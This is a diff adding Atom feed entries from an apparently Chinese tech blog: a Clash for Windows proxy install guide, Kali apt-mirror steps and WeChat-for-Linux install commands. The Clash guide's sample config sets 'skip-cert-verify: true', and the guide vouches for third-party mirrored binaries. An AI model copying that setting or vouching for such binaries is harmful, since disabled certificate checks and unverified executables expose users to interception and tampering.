+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>clash for windows &amp; linux 安装教程</title>
+    <link href="https://macin.top/posts/46074a5e/"/>
+    <id>https://macin.top/posts/46074a5e/</id>
+    <published>2024-12-12T11:25:45.000Z</published>
+    <updated>2024-12-19T15:25:35.220Z</updated>
+    
+    <content type="html"><![CDATA[<p><code>Clash for Windows Github已删库,严格来讲它本来就是个闭源的产品，github只是个软件分发渠道而已，删库并不影响软件的使用,本站提供完整备份下载，目前仍然好用。如果您对删库有顾虑可以使用全开源替代品 clash-verge</code> <a href="https://clashforwindows.app/#clash-for-windows-%E6%9C%80%E4%BD%B3%E6%9B%BF%E4%BB%A3">🌟点击查看最佳替代</a></p><p>节点转换工具：<a href="https://v2rayse.com/node-convert">V2Ray节点转换工具 | 免费VPN节点分享与管理平台</a></p><p>另一个代理工具nekoray：<a href="https://github.com/Matsuridayo/nekoray/releases">Releases · MatsuriDayo&#x2F;nekoray</a></p><h2 id="Clash-介绍"><a href="#Clash-介绍" class="headerlink" title="Clash 介绍 #"></a>Clash 介绍 <a href="https://clashforwindows.app/#clash-%E4%BB%8B%E7%BB%8D"><em>#</em></a></h2><p>🚩Clash：一个 Go 语言开发的多平台代理客户端。<a href="https://github.com/Dreamacro/clash">Github</a></p><p>🚩ClashX：Clash 的 Mac 图形客户端。<a href="https://github.com/yichengchen/clashX">Github</a></p><p>🚩ClashForAndroid：Clash 的 Android 图形客户端。<a href="https://github.com/Kr328/ClashForAndroid">Github</a></p><p>🚩Clash for Windows：Clash 的 Windows&#x2F;macOS&#x2F;Linux 图形客户端。<del><a href="https://github.com/Fndroid/clash_for_windows_pkg">Github</a> 仓库地址已经删除。</del></p><h2 id="Clash-for-Windows-是什么？"><a href="#Clash-for-Windows-是什么？" class="headerlink" title="Clash for Windows 是什么？ #"></a>Clash for Windows 是什么？ <a href="https://clashforwindows.app/#clash-for-windows-%E6%98%AF%E4%BB%80%E4%B9%88"><em>#</em></a></h2><p>Clash for Windows是一款在 Windows 平台上专门设计的图形化网络代理工具，旨在帮助用户实现更加自由和安全的互联网访问。</p><p>它是基于开源项目 Clash 的一个分支，支持多种操作系统，包括 <code>Windows、macOS、Linux</code> 三大平台。</p><p>通过本文您可以快速掌握其使用Clash for Windows，接入国际互联网。</p><h2 id="Clash-for-Windows主要特点"><a href="#Clash-for-Windows主要特点" class="headerlink" title="Clash for Windows主要特点 #"></a>Clash for Windows主要特点 <a href="https://clashforwindows.app/#clash-for-windows%E4%B8%BB%E8%A6%81%E7%89%B9%E7%82%B9"><em>#</em></a></h2><ul><li><strong>多协议支持</strong>：Clash for Windows 支持多种代理协议，如 Vmess、Shadowsocks、Snell 和 SOCKS5，满足不同用户的需求。</li><li><strong>直观界面</strong>：用户界面简洁易用，即使是初学者也能快速上手。</li><li><strong>智能路由管理</strong>：通过灵活的规则配置，用户可以根据需求智能选择代理规则，确保网络行为的隐私和安全。</li><li><strong>高速稳定连接</strong>：利用智能路由和负载均衡技术，Clash for Windows 确保网络连接的稳定性和速度，适合浏览网页和观看视频。</li></ul><h2 id="Windows-Clash客户端"><a href="#Windows-Clash客户端" class="headerlink" title="Windows Clash客户端 #"></a>Windows Clash客户端 <a href="https://clashforwindows.app/#windows-clash%E5%AE%A2%E6%88%B7%E7%AB%AF"><em>#</em></a></h2><p>Clash 在 Windows 平台使用最流行的客户端有两款：Clash for Windows、Clash Verge：</p><ul><li>Clash for Windows<ul><li>官网：因未知原因，官方作者已移除官网及下载地址。</li><li>下载：<a href="https://clashforwindows.app/#%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8B%E8%BD%BD">点击前往下载</a></li><li>使用教程：<a href="https://clashforwindows.app/#%E5%90%AF%E5%8A%A8-clash-for-windows">点击查看</a></li></ul></li><li>Clash Verge Rev<ul><li>官网：<a href="https://github.com/Clash-Verge-rev/clash-verge-rev/">https://github.com/Clash-Verge-rev/clash-verge-rev/</a></li><li>下载：<a href="https://clash-verge.com/#%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8B%E8%BD%BD">点击前往下载</a></li><li>使用教程：<a href="https://clash-verge.com/">点击查看</a></li></ul></li></ul><h2 id="Clash-for-Windows客户端下载"><a href="#Clash-for-Windows客户端下载" class="headerlink" title="Clash for Windows客户端下载 #"></a>Clash for Windows客户端下载 <a href="https://clashforwindows.app/#clash-for-windows%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8B%E8%BD%BD"><em>#</em></a></h2><p><strong>📍📍 <code>不要安装到中文目录下、不要安装到中文目录下、不要安装到中文目录下</code></strong></p><p>目前 Clash for Windows 最新版本为 <strong>v0.20.39</strong>，下面是各个平台对应架构版本列表。</p><p>在Windows平台上如果您不知道自己的电脑是什么架构，那么喜欢安装版（装到电脑上程序列表能搜到）就 <a href="https://ghp.ci/https://github.com/clash-hub/clash_for_windows_pkg/releases/download/Latest/Clash.for.Windows.Setup.0.20.39.exe"><strong>下载安装版</strong></a> 喜欢绿色版（不用安装压缩包解压缩就能运行，部分功能可能会受限制）就 <a href="https://ghp.ci/https://github.com/clash-hub/clash_for_windows_pkg/releases/download/Latest/Clash.for.Windows-0.20.39-win.7z"><strong>下载绿色版</strong></a></p><p>如果是Mac或Linux平台，您可以直接从下面列表对应的平台下载安装程序。<strong>原厂备份，绝无修改，😂笑死根本不会改。</strong></p><table><thead><tr><th align="left">文件名</th><th>说明</th><th>下载</th></tr></thead><tbody><tr><td align="left">Clash.for.Windows-0.20.39-arm64-linux.tar.gz</td><td>Linux ARM 64 位 版本 压缩包</td><td><a href="https://ghp.ci/https://github.com/clash-hub/clash_for_windows_pkg/releases/download/Latest/Clash.for.Windows-0.20.39-arm64-linux.tar.gz">下载</a></td></tr><tr><td align="left"><strong>⭐Clash.for.Windows-0.20.39-win.7z</strong></td><td>Windows 64 位 版本 压缩包</td><td><a href="https://ghp.ci/https://github.com/clash-hub/clash_for_windows_pkg/releases/download/Latest/Clash.for.Windows-0.20.39-win.7z">下载</a></td></tr><tr><td align="left">Clash.for.Windows-0.20.39-x64-linux.tar.gz</td><td>Linux 64 位 版本 压缩包</td><td><a href="https://ghp.ci/https://github.com/clash-hub/clash_for_windows_pkg/releases/download/Latest/Clash.for.Windows-0.20.39-x64-linux.tar.gz">下载</a></td></tr><tr><td align="left">Clash.for.Windows-0.20.39.dmg</td><td>Mac 64 位 版本</td><td><a href="https://ghp.ci/https://github.com/clash-hub/clash_for_windows_pkg/releases/download/Latest/Clash.for.Windows-0.20.39.dmg">下载</a></td></tr><tr><td align="left">Clash.for.Windows.Setup.0.20.39.arm64.exe</td><td>Windows ARM 64 位 版本</td><td><a href="https://ghp.ci/https://github.com/clash-hub/clash_for_windows_pkg/releases/download/Latest/Clash.for.Windows.Setup.0.20.39.arm64.exe">下载</a></td></tr><tr><td align="left"><strong>⭐Clash.for.Windows.Setup.0.20.39.exe</strong></td><td>Windows 64 位 版本</td><td><a href="https://ghp.ci/https://github.com/clash-hub/clash_for_windows_pkg/releases/download/Latest/Clash.for.Windows.Setup.0.20.39.exe">下载</a></td></tr><tr><td align="left">Clash.for.Windows.Setup.0.20.39.ia32.exe</td><td>Windows 英特尔 32 位 版本</td><td><a href="https://ghp.ci/https://github.com/clash-hub/clash_for_windows_pkg/releases/download/Latest/Clash.for.Windows.Setup.0.20.39.ia32.exe">下载</a></td></tr></tbody></table><p>不习惯英文的可以下载第三方汉化版<a href="https://ghp.ci/https://github.com/clash-hub/clash_for_windows_chinese/releases/download/Latest/Clash.for.Windows-0.20.39-win-zh.7z">Clash for Windows 第三方汉化版</a> 。</p><p>📍📍 不过我一般是不推荐用汉化版本的，经过第三方修改，并不确定是否加藏私货，我们需要用的英文非常少，几乎不用懂英文就能使用原版。</p><h2 id="启动-Clash-for-Windows"><a href="#启动-Clash-for-Windows" class="headerlink" title="启动 Clash for Windows #"></a>启动 Clash for Windows <a href="https://clashforwindows.app/#%E5%90%AF%E5%8A%A8-clash-for-windows"><em>#</em></a></h2><p>首次启动 Clash for Windows 后出现如下图所示表示启动成功。如果左下角 <code>connected</code> 不是绿色状态则表示启动失败。</p><p><a href="https://clashforwindows.app/images/cfw-start.png"><img src="/img/clashforwindows/1.webp" alt="启动Clash for Windows"></a></p><h2 id="导入Clash标准订阅"><a href="#导入Clash标准订阅" class="headerlink" title="导入Clash标准订阅 #"></a>导入Clash标准订阅 <a href="https://clashforwindows.app/#%E5%AF%BC%E5%85%A5clash%E6%A0%87%E5%87%86%E8%AE%A2%E9%98%85"><em>#</em></a></h2><p>导入配置文件有如下两个途径：</p><ul><li><a href="https://clashforwindows.app/#url%E5%AF%BC%E5%85%A5">URL 导入</a></li><li><a href="https://clashforwindows.app/#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%8B%96%E6%8B%BD%E5%AF%BC%E5%85%A5">本地文件拖拽导入</a></li></ul><p>一般情况下，URL 及配置文件都由机场代理服务商提供复制或下载。 如果您自建了节点，可以随便找个机场的配置下载下来修改对应的配置文件。以本地文件拖拽的方式使用自建节点。</p><h3 id="通过URL导入Clash配置"><a href="#通过URL导入Clash配置" class="headerlink" title="通过URL导入Clash配置 #"></a>通过URL导入Clash配置 <a href="https://clashforwindows.app/#%E9%80%9A%E8%BF%87url%E5%AF%BC%E5%85%A5clash%E9%85%8D%E7%BD%AE"><em>#</em></a></h3><p><a href="https://clashforwindows.app/images/clash-for-windows-url-import.png"><img src="/img/clashforwindows/2.webp" alt="clash for windows url导入"></a></p><h3 id="通过本地文件拖拽导入Clash配置"><a href="#通过本地文件拖拽导入Clash配置" class="headerlink" title="通过本地文件拖拽导入Clash配置 #"></a>通过本地文件拖拽导入Clash配置 <a href="https://clashforwindows.app/#%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%8B%96%E6%8B%BD%E5%AF%BC%E5%85%A5clash%E9%85%8D%E7%BD%AE"><em>#</em></a></h3><p>自建节点服务器需要自行编辑配置文件并导入,示例配置文件如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">proxies:</span><br><span class="line">    - &#123; name: &#x27;Trojan节点名称&#x27;, type: trojan, server: 节点服务器地址, port: 端口号, password: Trojan密码, udp: true, sni: 节点服务器地址, skip-cert-verify: true &#125;</span><br><span class="line">    - &#123; name: &#x27;V2Ray节点名称&#x27;, type: vmess, server: 节点服务器地址, port: 端口号, uuid: V2Ray UUID, alterId: 0, cipher: auto, udp: true, tls: true, network: tcp, sni: 节点服务器地址, skip-cert-verify: true &#125;</span><br><span class="line">proxy-groups:</span><br><span class="line">    - &#123; name: 自建节点, type: select, proxies: [自动选择, 故障转移, &#x27;Trojan节点名称&#x27;, &#x27;V2Ray节点名称&#x27;] &#125;</span><br><span class="line">    - &#123; name: 自动选择, type: url-test, proxies: [&#x27;Trojan节点名称&#x27;, &#x27;V2Ray节点名称&#x27;], url: &#x27;http://www.gstatic.com/generate_204&#x27;, interval: 86400 &#125;</span><br><span class="line">    - &#123; name: 故障转移, type: fallback, proxies: [&#x27;Trojan节点名称&#x27;, &#x27;V2Ray节点名称&#x27;],url: &#x27;http://www.gstatic.com/generate_204&#x27;, interval: 7200 &#125;</span><br></pre></td></tr></table></figure><p>Clash for Windows 支持拖拽导入，直接将本地配置文件拖拽至配置界面中即可，如下图所示：</p><p><a href="https://clashforwindows.app/images/clash-for-windows-import.webp"><img src="/img/clashforwindows/3.png" alt="clash for windows手动导入"></a></p><h2 id="选择Clash节点"><a href="#选择Clash节点" class="headerlink" title="选择Clash节点 #"></a>选择Clash节点 <a href="https://clashforwindows.app/#%E9%80%89%E6%8B%A9clash%E8%8A%82%E7%82%B9"><em>#</em></a></h2><p>不同的机场服务商提供的配置不同，但大体操作逻辑是一样的。此处以我自用的机场举例。</p><p>点击 Proxies → 选择 Rule → 点击 🚀 节点选择 展开节点列表 → 选择一个节点</p><p><a href="https://clashforwindows.app/images/clash-for-windows-select-node.png"><img src="/img/clashforwindows/4.webp" alt="clash for windows选择节点"></a></p><p>代理模式</p><ul><li>全局（Global）：所有请求直接发往代理服务器</li><li>规则（Rule）：所有请求根据配置文件规则进行分流</li><li>直连（ Direct ）：所有请求直接发往目的地</li></ul><p>一般机场的规则模式基本涵盖了我们大多数人想要接入的国际互联网服务网址，小众群体如果有特殊要求可以选择全局模式。</p><p>📍📍 注意：全局模式可能会导致国内流量也走代理访问，除了网络会变慢外，还会消耗套餐流量。规则模式的好处就是区分国内国外的流量只有在规则内的国外网站才会走代理，这样即不影响国内访问速度，又节省套餐流量。</p><h2 id="启动Clash-for-Windows代理"><a href="#启动Clash-for-Windows代理" class="headerlink" title="启动Clash for Windows代理 #"></a>启动Clash for Windows代理 <a href="https://clashforwindows.app/#%E5%90%AF%E5%8A%A8clash-for-windows%E4%BB%A3%E7%90%86"><em>#</em></a></h2><p>点击 General → 打开 SystemProxy 开关,启动代理服务即可接入国际互联网。</p><p><a href="https://clashforwindows.app/images/clash-for-windows-start-service.png"><img src="/img/clashforwindows/5.webp" alt="clash for windows start service"></a></p><h2 id="检查代理"><a href="#检查代理" class="headerlink" title="检查代理 #"></a>检查代理 <a href="https://clashforwindows.app/#%E6%A3%80%E6%9F%A5%E4%BB%A3%E7%90%86"><em>#</em></a></h2><p>开启系统代理后，打开浏览器，先 <strong>打开一个无痕窗口(排除插件干扰)</strong> 访问一下Google看能否正常访问。如果Google访问正常那说明代理配置没问题。代理开启来以后可以通过 <a href="https://yestool.org/my-ip-search/">🔗<strong>我的 IP 地址查询_我的 IP_IP 查询</strong></a> 查看节点 ip 地址。</p><h2 id="Clash-for-Windows节点"><a href="#Clash-for-Windows节点" class="headerlink" title="Clash for Windows节点 #"></a>Clash for Windows节点 <a href="https://clashforwindows.app/#clash-for-windows%E8%8A%82%E7%82%B9"><em>#</em></a></h2><p>要使用代理上网功能，我们需要在软件中添加一个服务器节点，也称为机场节点。这类节点一般都是机场主购买服务器搭建好的服务，即买即用。在使用 Clash for Windows 之前，请确保至少拥有一个节点。 <a href="https://cn.bing.com/search?q=%E6%9C%BA%E5%9C%BA%E8%8A%82%E7%82%B9">查找机场节点</a></p><h3 id="免费体验节点"><a href="#免费体验节点" class="headerlink" title="免费体验节点 #"></a>免费体验节点 <a href="https://clashforwindows.app/#%E5%85%8D%E8%B4%B9%E4%BD%93%E9%AA%8C%E8%8A%82%E7%82%B9"><em>#</em></a></h3><p>一般很少有机场主提供纯免费的节点，大多是提供一定时间的体验时长和体验流量，然后顺带着推荐自己的付费套餐，纯纯免费的反而要小心，羊毛出在羊身上。如果真需要免费的Clash for Windows节点，可以通过搜索引擎查找。 使用时最好不要涉及自己的用户隐私。尤其时关于金钱的操作要慎之又慎。</p><h3 id="付费机场节点"><a href="#付费机场节点" class="headerlink" title="付费机场节点 #"></a>付费机场节点 <a href="https://clashforwindows.app/#%E4%BB%98%E8%B4%B9%E6%9C%BA%E5%9C%BA%E8%8A%82%E7%82%B9"><em>#</em></a></h3><p>付费节点更加稳定，在不同的网络环境下能够保持相对一致的用户体验。所以有调节的话还是推荐选择付费节点，一般来讲 20元左右&#x2F;100G&#x2F;月 是相对普遍的价格。您可以根据自己的钱包状况选择适合自己的套餐。</p><p><a href="https://cn.bing.com/search?q=%E6%9C%BA%E5%9C%BA%E8%8A%82%E7%82%B9">查找机场节点</a></p><p>机场节点还有要注意一点，就是再便宜的优惠折扣，我们订阅付费周期不要超过一年，我们可以到期再续，防止被割韭菜——买了了2、3年的套餐后机场跑路。</p><h3 id="vps自建节点"><a href="#vps自建节点" class="headerlink" title="vps自建节点 #"></a>vps自建节点 <a href="https://clashforwindows.app/#vps%E8%87%AA%E5%BB%BA%E8%8A%82%E7%82%B9"><em>#</em></a></h3><p>如果对节点的稳定性、隐私性要求较高，且具备一定的技术基础的用户，我们建议自行搭建节点。这样可以保证代理速度和安全性最高。</p><p>请注意，搭建节点需要一定的技术能力，因为自建节点的话容易被封，需要额外SSH链接、配置协议、套cdn等操作。不建议新手尝试。</p><p><a href="https://cloudvpshub.net/">购买vps云主机</a></p><h2 id="Cloudflare-自建节点"><a href="#Cloudflare-自建节点" class="headerlink" title="Cloudflare 自建节点 #"></a>Cloudflare 自建节点 <a href="https://clashforwindows.app/#cloudflare-%E8%87%AA%E5%BB%BA%E8%8A%82%E7%82%B9"><em>#</em></a></h2><p>通过 Cloudflare Workers 自建节点，可以让我们替代传统的 VPS 翻墙代理繁琐的搭建过程。Cloud Workers 提供的免费套餐，存在 10 万&#x2F;天的请求次数限制，但对于个人用户或小型项目来说，这通常是足够的。</p><p>得益于 Cloudflare 的全球网络基础设施，与自建 VPS 相比，Cloudflare Workers 能够利用 Cloudflare 的边缘计算资源，让用户的请求在离他们最近的数据中心处理，从而实现更快的内容加载速度和更低的响应时间。</p><p>[Cloudflare 自建节点教程](<a href="https://cn.bing.com/search?q=%E4%BD%BF%E7%94%A8">https://cn.bing.com/search?q=使用</a> Cloudflare Workers 自建节点)</p><h2 id="Clash-for-Windows常见问题"><a href="#Clash-for-Windows常见问题" class="headerlink" title="Clash for Windows常见问题 #"></a>Clash for Windows常见问题 <a href="https://clashforwindows.app/#clash-for-windows%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><em>#</em></a></h2><h3 id="clash-for-windows支持哪些协议？"><a href="#clash-for-windows支持哪些协议？" class="headerlink" title="clash for windows支持哪些协议？ #"></a>clash for windows支持哪些协议？ <a href="https://clashforwindows.app/#clash-for-windows%E6%94%AF%E6%8C%81%E5%93%AA%E4%BA%9B%E5%8D%8F%E8%AE%AE"><em>#</em></a></h3><p>答:支持 Shadowsocks(SS)、Socks、Snell、V2Ray、Trojan 等代理协议。自 v0.11.2 开始，开始支持 ShadowsocksR(SSR)。</p><h2 id="clash-for-windows界面显示不全无法操作？"><a href="#clash-for-windows界面显示不全无法操作？" class="headerlink" title="clash for windows界面显示不全无法操作？ #"></a>clash for windows界面显示不全无法操作？ <a href="https://clashforwindows.app/#clash-for-windows%E7%95%8C%E9%9D%A2%E6%98%BE%E7%A4%BA%E4%B8%8D%E5%85%A8%E6%97%A0%E6%B3%95%E6%93%8D%E4%BD%9C"><em>#</em></a></h2><p>答:删除软件主目录的 config.yml 文件并重启软件即可。</p><h3 id="Windows系统中，TUN-模式下无法使用热点分享功能怎么办？"><a href="#Windows系统中，TUN-模式下无法使用热点分享功能怎么办？" class="headerlink" title="Windows系统中，TUN 模式下无法使用热点分享功能怎么办？ #"></a>Windows系统中，TUN 模式下无法使用热点分享功能怎么办？ <a href="https://clashforwindows.app/#windows%E7%B3%BB%E7%BB%9F%E4%B8%ADtun-%E6%A8%A1%E5%BC%8F%E4%B8%8B%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%E7%83%AD%E7%82%B9%E5%88%86%E4%BA%AB%E5%8A%9F%E8%83%BD%E6%80%8E%E4%B9%88%E5%8A%9E"><em>#</em></a></h3><p>解决方法如下：</p><ul><li>开启热点分享功能，此时系统网络设置中会生成一个网卡</li><li>开启 TUN 模式</li><li>进入系统网络设置，在 Clash 网卡右键选择属性，选择共享标签页</li><li>勾选“允许其他网络用户通过此计算机的 Internet 连接来连接”</li><li>在“家庭网络连接”选择框中选择第 1 步生成的网卡</li></ul><h2 id="Clash-for-Windows-注意事项"><a href="#Clash-for-Windows-注意事项" class="headerlink" title="Clash for Windows 注意事项 #"></a>Clash for Windows 注意事项 <a href="https://clashforwindows.app/#clash-for-windows-%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><em>#</em></a></h2><p>1、不要泄露节点个人专属配置文件，以防止他人使用及知晓你的密码。</p><p>2、建议定期手动更新或者设置成启动时自动更新订阅，即可保持与服务器同步更新。</p><p>3、Clash for Windows 如果出现 BUG,删掉软件重新下一次并重新配置，还不行就用下面最佳替代。</p><h2 id="Clash-for-Windows-最佳替代"><a href="#Clash-for-Windows-最佳替代" class="headerlink" title="Clash for Windows 最佳替代 #"></a>Clash for Windows 最佳替代 <a href="https://clashforwindows.app/#clash-for-windows-%E6%9C%80%E4%BD%B3%E6%9B%BF%E4%BB%A3"><em>#</em></a></h2><p>由于Clash for windows 已经删库不再维护，虽然当前来看使用完全没问题，但是后续如果内核增加新特性那就没法支持了。所以已经有新的接替者： <a href="https://clash-verge.com/">🌟全开源Clash for windows替代：clash verge🌟</a></p>]]></content>
+    
+    
+    <summary type="html">clash,hack,proxy</summary>
+    
+    
+    
+    <category term="proxy" scheme="https://macin.top/categories/proxy/"/>
+    
+    <category term="clash" scheme="https://macin.top/categories/proxy/clash/"/>
+    
+    
+    <category term="proxy" scheme="https://macin.top/tags/proxy/"/>
+    
+    <category term="hack" scheme="https://macin.top/tags/hack/"/>
+    
+    <category term="clash" scheme="https://macin.top/tags/clash/"/>
+    
+    <category term="leak" scheme="https://macin.top/tags/leak/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>kali更换镜像源</title>
+    <link href="https://macin.top/posts/db6f2bc4/"/>
+    <id>https://macin.top/posts/db6f2bc4/</id>
+    <published>2024-12-12T10:44:12.000Z</published>
+    <updated>2024-12-19T15:25:35.224Z</updated>
+    
+    <content type="html"><![CDATA[<p>1.进入管理员下的控制台。</p><p>2.输入密码后点击“授权”。</p><p>3.在控制台内输入下面的内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>4.敲击回车后会进入下面的页面。</p><p>5.来到这个页面后的第一部是按键盘上的“i”键，左下角出现“插入”后说明操作正确。</p><p>6.使用“#”将原本的源给注释掉。</p><p>7.从下面的源内选择一个复制下来准备粘贴进去（都是优质源，复制哪个都可以）。</p><p>中科大Kali镜像源（推荐）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><p>阿里云Kali镜像源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><p>清华大学Kali镜像源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure><p>8.将上面复制的源粘贴到下图所示位置。</p><p>9.按键盘上的“ESC”键，左下角的“插入”消失说明操作正确。</p><p>10.输入“:wq!”（注意使用英文输入法），这步操作是保存配置并退出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:wq!</span><br></pre></td></tr></table></figure><p>11.回车后便成功保存并退出了。</p><p>12.之后执行下面的命令更新源。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure><p>13.回车后等待即可，约一分钟，出现下面页面即更新成功了。</p><p>14.接下来可以使用下面的命令来对软件进行更新（如果不需要更新则可以忽略下面内容）。</p><p>命令1： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get upgrade</span><br></pre></td></tr></table></figure><p>命令2： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get dist-upgrade</span><br></pre></td></tr></table></figure><p>上面两条命令均是用来更新所有软件的，不同的是： 它能识别新版本的依赖关系， 将不要的依赖进行卸载， 将需要升级的依赖进行升级。</p><p>注：</p><p>在更新软件期间可能会需要确认、配置、显示更新日志等，按照提示操作即可。</p><p>15.安装或更新完成后，会遗留一些软件的安装包，会占用部分硬盘空间，可使用下面的命令来对其进行清理。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get clean</span><br></pre></td></tr></table></figure><p>组合命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get clean</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">kali,os,hack</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    <category term="hack" scheme="https://macin.top/categories/hack/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="hack" scheme="https://macin.top/tags/hack/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>kali,ubuntu,debian,centos安装linux版微信</title>
+    <link href="https://macin.top/posts/685a2905/"/>
+    <id>https://macin.top/posts/685a2905/</id>
+    <published>2024-12-11T14:47:18.000Z</published>
+    <updated>2024-12-19T15:25:35.223Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><p>第一步，在微信官方网站 <a href="https://weixin.qq.com/">https://weixin.qq.com/</a> 选择Linux版本</p><p><img src="/img/wechat_linux/1.webp" alt="在这里插入图片描述"><br>第二步，选择X86版deb安装包<br><img src="/img/wechat_linux/2.webp" alt="在这里插入图片描述"><br>第三步,在下载路径下用命令行输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i WeChatLinux_x86_64.deb</span><br></pre></td></tr></table></figure><p>进行安装，大功告成！！！<br><img src="/img/wechat_linux/3.webp" alt="在这里插入图片描述"></p><h3 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h3><p><img src="/img/wechat_linux/4.webp" alt="在这里插入图片描述"><br>windows版微信支持的，linux版本的也都能支持，看一看，搜一搜，小程序等都支持,功能齐全。之前缺失的功能，朋友圈功能已上线！赶紧去体验吧小伙伴们~~<br><img src="/img/wechat_linux/5.webp" alt="在这里插入图片描述"></p><h3 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h3><p>原来的微信卸载方式：<br>1、查询wechat相关apk命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg --list | grep wechat</span><br></pre></td></tr></table></figure><p><code>2、卸载wechat相关apk命令：</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --remove com.tencent.wechat</span><br><span class="line">sudo dpkg --remove electronic-wechat-icons-atzlinux</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">kali,os,hack,debian,ubuntu,centos</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="centos" scheme="https://macin.top/categories/os/centos/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+    <category term="centos" scheme="https://macin.top/tags/centos/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="hack" scheme="https://macin.top/tags/hack/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>kali安装clashverge</title>
+    <link href="https://macin.top/posts/3c83cc33/"/>
+    <id>https://macin.top/posts/3c83cc33/</id>
+    <published>2024-12-11T14:36:38.000Z</published>
+    <updated>2024-12-19T15:25:35.223Z</updated>
+    
